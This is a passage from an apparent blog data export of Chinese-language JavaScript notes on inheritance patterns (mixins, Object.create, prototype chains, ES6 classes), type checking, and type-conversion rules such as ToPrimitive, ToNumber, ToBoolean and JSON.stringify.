href=\"#5、实现继承的几种方式\" class=\"headerlink\" title=\"5、实现继承的几种方式\"></a>5、实现继承的几种方式</h3><h5 id=\"5-1-使用混入方式实现继承\"><a href=\"#5-1-使用混入方式实现继承\" class=\"headerlink\" title=\"5.1 使用混入方式实现继承\"></a>5.1 使用混入方式实现继承</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">mixin</span> (<span class=\"params\">sourceObj, targetObj</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> k <span class=\"keyword\">in</span> sourceObj) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!targetObj[k]) &#123;</span><br><span class=\"line\">            targetObj[k] = sourceObj[k];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> targetObj;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> Person = &#123;</span><br><span class=\"line\">    name: <span class=\"string\">&#x27;nobody&#x27;</span>,</span><br><span class=\"line\">    showName () &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> stu = mixin(Person, &#123;</span><br><span class=\"line\">    name: <span class=\"string\">&#x27;xxb&#x27;</span>,</span><br><span class=\"line\">    age: <span class=\"number\">24</span>,</span><br><span class=\"line\">    showAge () &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.age);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\">stu.showName();</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"5-2-使用对象委托实现继承\"><a href=\"#5-2-使用对象委托实现继承\" class=\"headerlink\" title=\"5.2 使用对象委托实现继承\"></a>5.2 使用对象委托实现继承</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> Person = &#123;</span><br><span class=\"line\">    init (name) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    showName () &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> Student = <span class=\"built_in\">Object</span>.create(Person);</span><br><span class=\"line\"></span><br><span class=\"line\">Student.init = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">name, age</span>) </span>&#123;</span><br><span class=\"line\">    Person.init.call(<span class=\"built_in\">this</span>, name);</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.age = age;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">Student.showAge = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.age);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> stu = <span class=\"built_in\">Object</span>.create(Student);</span><br><span class=\"line\">stu.init(<span class=\"string\">&#x27;xxb&#x27;</span>, <span class=\"number\">24</span>);</span><br><span class=\"line\">stu.showName();</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// `Object.create()` 会创建一个新对象并把它关联到指定的对象就可以充分发挥 [[Prototype]] 机制的作用（委托），</span></span><br><span class=\"line\"><span class=\"comment\">// 并且避免不必要的麻烦（如使用 `new` 的构造函数调用会生成 `.prototype` 和 `.constructor` 引用）。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// `Object.create() `没有其他副作用，ES6添加了辅助函数 `Object.setPrototypeOf()` ，用以实现同样的功能</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"5-3-使用原型链继承\"><a href=\"#5-3-使用原型链继承\" class=\"headerlink\" title=\"5.3 使用原型链继承\"></a>5.3 使用原型链继承</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Person</span> (<span class=\"params\">name</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Person.prototype.showName = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.name);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Student</span> (<span class=\"params\">name, age</span>) </span>&#123;</span><br><span class=\"line\">    Person.call(<span class=\"built_in\">this</span>, name);</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.age = age;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Student.prototype = <span class=\"built_in\">Object</span>.create(Person.prototype);</span><br><span class=\"line\">Student.prototype.constructor = Student;</span><br><span class=\"line\">Student.prototype.showAge = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.age);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> stu = <span class=\"keyword\">new</span> Student(<span class=\"string\">&#x27;xxb&#x27;</span>, <span class=\"number\">24</span>);</span><br><span class=\"line\">stu.showName();</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 如果使用 `Student.prototype = Person.prototype` 并不会创建一个关联到 `Student.prototype` 的新对象，</span></span><br><span class=\"line\"><span class=\"comment\">// 它只是让 `Student.prototype` 直接引用 `Person.prototype` 对象。</span></span><br><span class=\"line\"><span class=\"comment\">// 因此当执行类似 `Student.prototype.show = ... ` 的赋值语句时会直接修改 `Person.prototype` 对象本身。</span></span><br><span class=\"line\"><span class=\"comment\">// 显然这不是想要的结果，否则根本不需要 `Student` 对象，直接使用 `Person` 就行了。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 如果使用 `Student.prototype = new Person()` 的确会创建一个关联到 `Student.prototype` 的新对象。</span></span><br><span class=\"line\"><span class=\"comment\">// 但是它使用了 `Person()` 的“构造函数调用”，如果函数 `Person` 有一些副作用（比如给 this 添加数据属性、修改状态、注册到其他对象等）的话，就会影响到 `Student()` 的“后代”</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"5-4-使用-class-实现继承\"><a href=\"#5-4-使用-class-实现继承\" class=\"headerlink\" title=\"5.4 使用 class 实现继承\"></a>5.4 使用 class 实现继承</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 使用 es6 的 `class` 实现继承</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Person</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"title\">constructor</span> (<span class=\"params\">name</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    showName () &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Student</span> <span class=\"keyword\">extends</span> <span class=\"title\">Person</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"title\">constructor</span> (<span class=\"params\">name, age</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(name);</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.age = age;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    showAge () &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"built_in\">this</span>.age);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> stu = <span class=\"keyword\">new</span> Student(<span class=\"string\">&#x27;xxb&#x27;</span>, <span class=\"number\">24</span>);</span><br><span class=\"line\">stu.showAge();</span><br></pre></td></tr></table></figure>\n\n<p><strong>class 的优点：</strong></p>\n<ol>\n<li>不需要引用 <code>.prototype</code> 对象；</li>\n<li>不需要通过 <code>Object.create()</code> 来替换 <code>.prototype</code> 对象，也不需要设置 <code>.__proto__</code> 或者 <code>Object.setPrototypeOf()</code> 来指定原型链；</li>\n<li>可以通过 <code>super()</code> 来实现相对多态，这样任何方法都可以引用原型链上层的同名方法。</li>\n<li><code>class</code> 字面语法不能声明属性（只能声明方法），避免原型链末端的“实例”可能会意外地获取 其他地方的属性；</li>\n<li>可以通过 <code>extends</code> 很自然地扩展对象（子）类型，甚至是内置的对象（子）类型。</li>\n</ol>\n<p><strong>class 的缺点：</strong></p>\n<ol>\n<li>class 基本上只是现有 <code>[[Prototype]]</code> 委托机制的一种语法糖。即 class 并不会像传统面向类的语言一样在声明时静态复制所有行为。如果无意修改或者替换了父“类”中的一个方法，那子“类”和所有实例都会受到影响，因为它们在定义时并没有进行复制，只是使用基于 <code>[[Prototype]]</code> 的实时委托。</li>\n<li>用 class 定义看上去不能被修改（静态），实际上依然可以被修改（动态）</li>\n<li>不能定义属性，只能往 <code>prototype</code> 上添加，但这样违背了 <code>class</code> 语法的本意，在实现中暴露了 <code>.prototype</code></li>\n<li>出于性能考虑， <code>super</code> 并不像 <code>this</code> 一样是晚绑定（动态绑定）的，它会在创建时静态绑定。</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// `super` 的静态绑定</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">P</span> </span>&#123;</span><br><span class=\"line\">    foo () &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;P.foo&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">C</span> <span class=\"keyword\">extends</span> <span class=\"title\">P</span> </span>&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> c1 = <span class=\"keyword\">new</span> C();</span><br><span class=\"line\">c1.foo(); <span class=\"comment\">// &quot;P.foo&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> D = &#123;</span><br><span class=\"line\">    foo: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log( <span class=\"string\">&quot;D.foo&quot;</span> );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> E = &#123;</span><br><span class=\"line\">    foo: C.prototype.foo</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.setPrototypeOf(E, D); <span class=\"comment\">// 把 E 委托到 D</span></span><br><span class=\"line\">E.foo(); <span class=\"comment\">// &quot;P.foo&quot;</span></span><br></pre></td></tr></table></figure>\n\n\n<p><strong>相关方法：</strong></p>\n<ul>\n<li><code>Object.create()</code>：创建一个对象并把这个对象的 <code>[[Prototype]]</code> 关联到指定的对象</li>\n<li><code>Object.setPrototypeOf()</code>：设置一个指定的对象的原型 ( 即内部<code>[[Prototype]]</code>属性）到另一个对象或 <code>null</code></li>\n<li><code>Object.getPrototypeOf()</code>：返回指定对象的原型（即内部 <code>[[Prototype]]</code> 属性的值）</li>\n<li><code>Object.defineProperty()</code>：在一个对象上定义一个新属性，或者修改一个对象的现有属性</li>\n<li><code>Object.prototype.hasOwnproperty()</code>：返回一个布尔值，指示对象是否具有指定的属性作为自身（不继承）属性</li>\n<li><code>Object.prototype.isPrototypeOf()</code>：测试一个对象是否存在于另一个对象的原型链上，与 <code>instanceof</code> 作用类似</li>\n<li><code>fon ... in ...</code>：以任意顺序遍历一个对象的可枚举属性（包括原型链上的属性，主要用于 Object 对象）</li>\n<li><code>fon ... of ...</code>：在可迭代对象(包括 <code>Array</code>, <code>Map</code>, <code>Set</code>, <code>String</code>, <code>arguments</code> 对象等)上创建一个迭代循环，遍历每个属性值</li>\n</ul>\n<p>相关文章<br><a href=\"https://github.com/ljianshu/Blog/issues/20\">JavaScript 继承</a></p>\n"},{"title":"数据类型与类型转换","date":"2021-01-27T04:32:18.000Z","_content":"\n### 1、数据类型\n\n八种数据类型：`null` 、 `undefined` 、 `boolean` 、 `number` 、 `string` 、 `symbol`、`bigint` 和 `object`\n\n```js\ntypeof undefined === 'undefined'; // true\ntypeof true === 'boolean'; // true\ntypeof 42 === 'number'; // true\ntypeof '42' === 'string'; // true\ntypeof { life: 42 } === 'object'; // true\ntypeof [1] === 'object'; // true\n\n// 历史遗留问题\ntypeof null === 'object'; // true\n\n// ES6中新加入的类型\ntypeof Symbol() === 'symbol'; // true\ntypeof 12n === 'bigint' // true\n```\n\n##### 1.1 类型判断\n\n###### 1.1.1 typeof\n\ntypeof 命令可以判断 Undefined, Boolean, String, Number, Symbol, BigInt 等基本数据类型，但无法判断 Null，Object, Array 等对象类型\n\n```js\ntypeof null === 'object'; // true\ntypeof {} === 'object'; // true\ntypeof [] === 'object'; // true\n```\n\n###### 1.1.2 instanceof （不推荐使用）\n\n适合用于判断自定义的类实例对象, 而不是用来判断原生的数据类型，会有一些问题，不推荐使用\n\n实质上是通过 constructor 字段来判断的，会逐层的在原型链上查找\n\n> iframe 之间不会共享原型链，通过 iframe 传值时，使用 instanceof 会有问题\n\n```js\nvar arr = []\narr instanceof Array // true\narr instanceof Object // true\n```\n\n###### 1.1.3 Object.prototype.toString() （推荐使用）\n\nObject.prototype.toString 方法, 可以获取到变量的准确的类型\n\n> `Object.prototype.toString` 的原理是当调用的时候, 就取值内部的 `[[Class]]` 属性值, 然后拼接成 `'[object ' + [[Class]] + ']'` 这样的字符串并返回\n\n```js\nconst fn = () => {};\nconst toString = Object.prototype.toString;\n\ntoString.call(undefined); // [object Undefined]\ntoString.call(null); // [object Null]\ntoString.call(true); // [object Boolean]\ntoString.call(1);  // [object Number]\ntoString.call(NaN); // [object Number]\ntoString.call('1'); // [object String]\ntoString.call(fn);  // [object Function]\ntoString.call([1,2,3]); // [object Array]\n\n```\n\n```js\n// 实现 typeof 函数判断所有数据类型\nconst typeOf = (obj) => {\n  const regex = /\\[object\\s(.+)]/;\n  const objStr = Object.prototype.toString.call(obj);\n  const res = objStr.match(regex);\n  console.log(res);\n\n  if (!res || !res[1]) throw new Error('typeof error');\n\n  return res[1].toLowerCase();\n}\n```\n\n###### 1.1.4 其他 API \n\n**Array.isArray()** 用于判断某个数据是否为数组，\n\npolyfill 实现如下：\n```js\nArray.isArray = Array.isArray || function(array){\n  return Object.prototype.toString.call(array) === '[object Array]';\n}\n```\n\n**Number.isNaN()** 方法确定传递的值是否为 `NaN`，并且检查其类型是否为 `Number`。\n\npolyfill 实现如下：\n```js\nNumber.isNaN = Number.isNaN || function(value) {\n    return typeof value === \"number\" && isNaN(value);\n}\n```\n\n**isNaN()** 方法用来确定一个值是否为 `NaN`，因为 `NaN !== NaN`\n\n> 将某些不能强制转换为数值的非数值转换为数值，或者算术运算返回一个未定义的或无法表示的值，会得到 `NaN`\n> 如果 `isNaN` 函数的参数不是 Number 类型， `isNaN` 函数会首先尝试将这个参数转换为数值，然后才会对转换后的结果是否是 `NaN` 进行判断，推荐使用 **Number.isNaN()**\n\n```js\nvar isNaN = function(value) {\n    var n = Number(value);\n    return n !== n;\n};\n```\n\n\n### 1.2 undefined 与 undeclared\n* 未被声明的变量，如 `b`，调用时报错 `ReferenceError: b is not defined`\n* 已被声明但未赋值的变量，如 `let a`， 直接调用时输出 `undefined`\n* `typeof` 有一个特殊的安全防范机制，变量未被声明时也返回 `undefined`\n\n```js\nconst { log } = console\nvar a;\n\nlog(a); // undefined\nlog(b); // ReferenceError: b is not defined\nlog(typeof a); // undefined\nlog(typeof b); // undefined\n```\n\n##### 1.3 机器精度\n\n比较两个浮点数最常见的方法是设置一个误差范围值，通常称为“机器精度”，对 JavaScript 的数字来说，这个值通常是 `2^-52` (2.220446049250313e-16) 。\n\n```js\n// 为 ES6 之前的版本写 polyfill\nif (!Number.EPSILON) {\n  Number.EPSILON = Math.pow(2, -52);\n}\n\nfunction numbersCloseEnoughToEqual(n1,n2) {\n  return Math.abs( n1 - n2 ) < Number.EPSILON;\n}\nvar a = 0.1 + 0.2;\nvar b = 0.3;\nnumbersCloseEnoughToEqual(a, b); // true\nnumbersCloseEnoughToEqual(0.0000001, 0.0000002); // false\n```\n\n```js\n// Q: 去数值的整数部分和小数部分\n\n// A: 使用 parseInt\n// 不推荐使用，不准确 & 性能问题\nvar a = 3.5\nparseInt(a) // 3\n\nvar b = 0.0000000000001 // 1e-13\nparseInt(b) // 1\n\n// A: 使用 Math.ceil()、Math.floor()\nfunction trunc(num) {\n  if(num >= 0) return Math.floor(num);\n  return Math.ceil(num);\n}\n\ntrunc(3.75); // 3\ntrunc(-3.75); // -3\n\n// A: 使用 % 运算\nconsole.log(3.75 % 1); // 0.75\nconsole.log(-3.75 % 1); // -0.75\n\n// A: 使用位运算\nconsole.log(~~3.75); // 3\nconsole.log(~~-3.75); // -3\n```\n\n##### todo: 取整数部分和小数部分\n\n### 2、对象、字符串、数字和布尔值之间类型转换规则\n\n##### 2.1 内部属性 [[class]]\n \n所有 `typeof` 返回值为 `\"object\"` 的对象都包含一个内部属性 `[[Class]]` （看作一个内部的分类），这个属性无法直接访问，一般通过 `Object.prototype.toString()` 来查看\n\n```js\nconst toString = Object.prototype.toString;\n\ntoString.call(null); // [object Null]\ntoString.call(undefined); // [object Undefined]\ntoString.call(true); // [object Boolean]\ntoString.call([]); // [object Array]\n```\n\n##### 2.2 toStringTag\n\n`Symbol.toStringTag` 是一个内置 `symbol`，它通常作为对象的属性键使用，对应的属性值应该为字符串类型，这个字符串用来表示该对象的自定义类型标签，通常只有内置的 `Object.prototype.toString()` 方法会去读取这个标签并把它包含在自己的返回值里。\n\n许多内置的 JavaScript 对象类型即便没有 `toStringTag` 属性，也能被 `toString()` 方法识别并返回特定的类型标签，比如：\n\n```js\nObject.prototype.toString.call('foo');     // \"[object String]\"\nObject.prototype.toString.call([1, 2]);    // \"[object Array]\"\nObject.prototype.toString.call(3);         // \"[object Number]\"\nObject.prototype.toString.call(true);      // \"[object Boolean]\"\nObject.prototype.toString.call(undefined); // \"[object Undefined]\"\nObject.prototype.toString.call(null);      // \"[object Null]\"\n// ... and more\n```\n\n另外一些对象类型则不然，`toString()` 方法能识别它们是因为引擎为它们设置好了 `toStringTag` 标签：\n\n```js\nObject.prototype.toString.call(new Map());       // \"[object Map]\"\nObject.prototype.toString.call(function* () {}); // \"[object GeneratorFunction]\"\nObject.prototype.toString.call(Promise.resolve()); // \"[object Promise]\"\n// ... and more\n```\n\n但你自己创建的类不会有这份特殊待遇，`toString()` 找不到 `toStringTag` 属性时只好返回默认的 Object 标签：\n\n```js\nclass ValidatorClass {}\n\nObject.prototype.toString.call(new ValidatorClass()); // \"[object Object]\"\n```\n\n加上 `toStringTag` 属性，你的类也会有自定义的类型标签了：\n\n```js\nclass ValidatorClass {\n  get [Symbol.toStringTag]() {\n    return \"Validator\";\n  }\n}\n\nObject.prototype.toString.call(new ValidatorClass()); // \"[object Validator]\"\n```\n\n##### 2.3 ToPrimitive 抽象操作\n\n`ToPrimitive(input, PreferredType)` 是JavaScript引擎内部的抽象操作，原理如下：\n可选参数 `PreferredType` 可以是 `Number` 或者 `String`，它只代表了一个转换的偏好，转换结果不一定必须是这个参数所指的类型，但转换结果一定是一个原始值。\n\n`PreferredType` 被标志为 `Number` 时：\n1. 如果输入的值已经是个原始值，则直接返回它\n2. 如果输入的值是一个对象，则调用该对象的 `valueOf()` 方法，如果 `valueOf()` 方法的返回值是一个原始值，则返回这个原始值\n3. 否则，调用这个对象的 `toString() `方法，如果 `toString()` 方法的返回值是一个原始值，则返回这个原始值\n4. 否则，抛出 TypeError 异常\n\n`PreferredType` 被标志为 `String` 时转换规则类似，不同的是先调用 `toString()` 方法，再调用 `valueOf() `方法\n\n> 如果没有 PreferredType 参数，则 PreferredType 的值会按照这样的规则来自动设置：Date 类型的对象会被设置为 String，其它类型的值会被设置为 Number（先调用 valueOf）\n\n```js\nvar obj = {\n   valueOf () {\n      console.log('valueOf');\n      return {};\n   },\n   toString () {\n      console.log('toString');\n      return {};\n   },\n}\n\nNumber(obj);\n// valueOf\n// toString\n// TypeError: Cannot convert object to primitive value\n\nString(obj);\n// toString\n// valueOf\n// TypeError: Cannot convert object to primitive value\n```\n\n| 类型 | valueOf() | toString() |\n| --- | --- | --- |\n| Boolean\t| true 或 false\t| 'true'或者 'false'\n| Number |\t数值 |\t数值的字符串形式 |\n| String |\t返回该对象表示的字符串值 |\t返回该对象表示的字符串值 |\n| Object |\t返回该对象 |\t'[object Object]' |\n| Array |\t返回该数组 |\t以,分割的字符串，类似Array.join(',') |\n| Date |\t返回日期的毫秒数 |\t返回带有时区信息的日期和时间 |\n| RegExp |\t返回该正则函数 |\t返回正则表达式字面量 |\n| Function |\t返回该函数 |\t将函数代码以字符串形式返回 |\n\n### 3 类型转换\n\n##### 3.1 ToNumber\nnumber 转换规则：\n* `true` 转换为 `1`\n* `false` 转换为 `0` ，\n* `undefined` 转换为 `NaN` \n* `null` 转换为 `0`\n* 字符串转为数字\n\n为了将值转换为相应的基本类型值，抽象操作 `ToPrimitive` 会首先检查该值是否有 `valueOf()` 方法，如果有并且返回基本类型值，就使用该值进行强制类型转换。如果没有就使用 `toString()` 的返回值（如果存在）来进行强制类型转换，否则会产生 `TypeError` 错误。\n\n```js\nvar a = {\n  valueOf() {\n    return \"42\";\n  }\n};\nvar b = {\n  toString() {\n    return \"42\";\n  }\n};\nvar c = [4, 2];\nc.toString = function () {\n  return this.join(\"\");\n};\nNumber(a); // 42\nNumber(b); // 42\nNumber(c); // 42\nNumber(\"\"); // 0\nNumber([]); // 0\nNumber([\"abc\"]); // NaN\n```\n\n\n##### 3.2 ToString\n字符串化规则： \n* `null` 转换为 `\"null\"`\n* `undefined` 转换为 `\"undefined\"`\n* `true` 转换为 `\"true\"`，\n* 数字转换为普通字符串（较大或较小数值使用指数形式）\n* 普通对象使用 `toString()` （ `Object.prototype.toString()` ）返回内部属性 `[[Class]]` 的值，如 `\"[object Object]\"`。\n\n> 如果对象有自己的 toString() 方法，字符串化时就会调用该方法并使用其返回值\n> 数组的默认 toString() 方法经过了重新定义，将所有单元字符串化以后再用 \",\" 连接\n\n```js\nvar num = '123456789';\nvar flag = true;\nvar n = null;\nvar u = undefined;\nvar obj = { name: 'xxb' };\nvar obj2 = {\n  name: 'xxb',\n  toString() {\n    return this.name + '-------';\n  }\n}\nvar arr = [1, 2, 3];\nvar error = new Error('123');\n\nnum.toString(); // 123456789\nflag.toString(); // true\nn + ''; // null\nu + ''; // undefined\nobj.toString(); // [object Object]\nobj2.toString(); // xxb-------\narr.toString(); // 1,2,3\nerror.toString(); // Error: 123\n```\n\n##### 3.3 ToBoolean\n`undefined`、`null`、`false`、`+0` 、` -0` 和 `NaN`、`\"\"` 将转换为 `false`，其他值转换为 `true`\n\n> 所有的对象都会转换为 true，包括{}、new Boolean(false)、new Number(0)、new String('')\n\n```js\n!! null // false\n!! '' // false\n!!NaN // false\n!!new Boolean(false) // true\n!!new Number(0); // true\n!!new String(\"\"); // true\n!! \"false\"; // true\n!! \"0\"; // true\n!! \"''\"; // true\n!!{}; // true\n```\n\n字符串和数字之间的转换是通过 String(..) 和 Number(..) 这两个内建函数（原生构造函数，参见第 3 章）来实现的，请注意它们前面没有 new 关键字，并不创建封装对象。\n~ 和 indexOf() 一起可以将结果强制类型转换（实际上仅仅是转换）为真 / 假值\n~ 比 >= 0 和 == -1 更简洁\n\n##### 3.4 JSON 字符串化\n\n1. 字符串、数字、布尔值和 `null` 的 `JSON.stringify()` 规则与 `ToString` 基本相同。\n2. 如果传递给 `JSON.stringify()` 的对象中定义了 `toJSON()` 方法，那么该方法会在字符串化前调用，以便将对象转换为安全的 JSON 值。\n\n所有安全的 JSON 值都可以使用 `JSON.stringify()` 字符串化。\n\n> 不安全的 JSON 值指 undefined 、 function 、 symbol和包含循环引用的对象，JSON.stringify() 在对象中遇到 undefined 、 function 和 symbol 时会自动将其忽略，在数组中则会返回 null （以保证单元位置不变）\n\n如果对象中定义了 toJSON() 方法，JSON 字符串化时会首先调用该方法，然后用它的返回值来进行序列化。如果要对含有非法 JSON 值的对象做字符串化，或者对象中的某些值无法被序列化时，就需要定义 toJSON() 方法来返回一个安全的 JSON 值。\n\n> toJSON() 返回的应该是一个适当的值，可以是任何类型，然后再由 JSON.stringify() 对其进行字符串化\n\n```js\nJSON.stringify(undefined); // undefined\nJSON.stringify(function(){}); // undefined\nJSON.stringify([1, undefined, function(){}, 4]); // \"[1,null,null,4]\"\nJSON.stringify({ a:2, b:function(){}}); // \"{\"a\":2}\"\n\nvar obj = {\n   name: 'xxb',\n   age: 24,\n   toJSON () {\n      return this.name;\n   }\n}\nJSON.stringify(undefined); // \"xxb\"\n```\n\n### 4 隐式转换\n\n##### 4.1 隐式强制转换为 String\n\n`+` 